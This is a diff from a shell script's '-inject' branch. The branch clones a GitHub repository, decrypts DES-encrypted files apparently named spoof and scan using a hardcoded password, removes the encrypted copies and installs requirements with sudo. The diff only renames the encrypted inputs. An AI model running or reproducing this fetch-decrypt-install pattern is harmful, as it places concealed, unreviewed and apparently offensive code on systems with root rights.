@@ -47,8 +47,8 @@ elif [[ $1 == "-inject" ]]; then
 
   cd ~ ; mkdir pootere ; cd pootere ; git clone https://github.com/mldMoldovan/samael.git ; cd samael
   openssl des -d -in zamael.sslz -out zamael -pass pass:nedea
-  openssl des -d -in spoof.sslz -out spoof -pass pass:nedea
-  openssl des -d -in scan.sslz -out scan -pass pass:nedea
+  openssl des -d -in spoof.py.sslz -out spoof -pass pass:nedea
+  openssl des -d -in scan.py.sslz -out scan -pass pass:nedea
   openssl des -d -in requirements.txt.sslz -out requirements.txt -pass pass:nedea
   rm -rf zamael.sslz ; rm -rf spoof.sslz ; rm -rf scan.sslz ; rm -rf requirements.txt.sslz
   sudo -H pip3 install -r requirements.txt
